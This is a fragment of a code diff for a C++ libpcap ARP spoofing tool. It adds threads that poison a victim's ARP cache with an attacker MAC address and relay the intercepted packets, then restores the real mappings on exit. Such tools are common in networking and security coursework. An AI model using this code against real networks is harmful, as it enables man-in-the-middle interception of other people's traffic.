@@ -120,7 +120,28 @@ int main(int argc, char *argv[]) {
                 pcap_close(thread_pcap);
         }));
 
+        threads.push_back(thread([&, i](){
+                // sender→target capture
+                pcap_t* thread_pcap = pcap_open_live(interface.c_str(), 65536, 1, 1, errbuf);
+                while (running.load()) {arp_relay(thread_pcap, attacker_mac, flows[i].smac, flows[i].tmac,
+                flows[i].sip, flows[i].tip);}
+                pcap_close(thread_pcap);
+        }));
+
+        threads.push_back(thread([&, i](){
+                // sender→target capture
+                if (!arp_infection(pcap, attacker_mac, flows[i].smac,
+            flows[i].sip, flows[i].tip)) {
+                    cout << "Failed ARP infection\n";
+                    return false;
+                    }
+                this_thread::sleep_for(chrono::milliseconds(10));
+        }));
+
+
+
     }
+
 
     cout << "Press key to stop" << "\n";
 
@@ -143,11 +164,15 @@ int main(int argc, char *argv[]) {
     //recover
     for (int i = 0; i < flows.size(); i++) {
         //send normal packet
-        if (!arp_infection(pcap, flows[i].tmac, flows[i].smac,
+        for (int j = 0; j < 5; j ++) {
+            if (!arp_infection(pcap, flows[i].tmac, flows[i].smac,
             flows[i].tip, flows[i].sip)) {
-            cout << "Failed ARP infection\n";
-            return false;
+                cout << "Failed ARP infection\n";
+                return false;
             }
+            this_thread::sleep_for(chrono::milliseconds(10));
+        }
+
     }
 
     pcap_close(pcap);
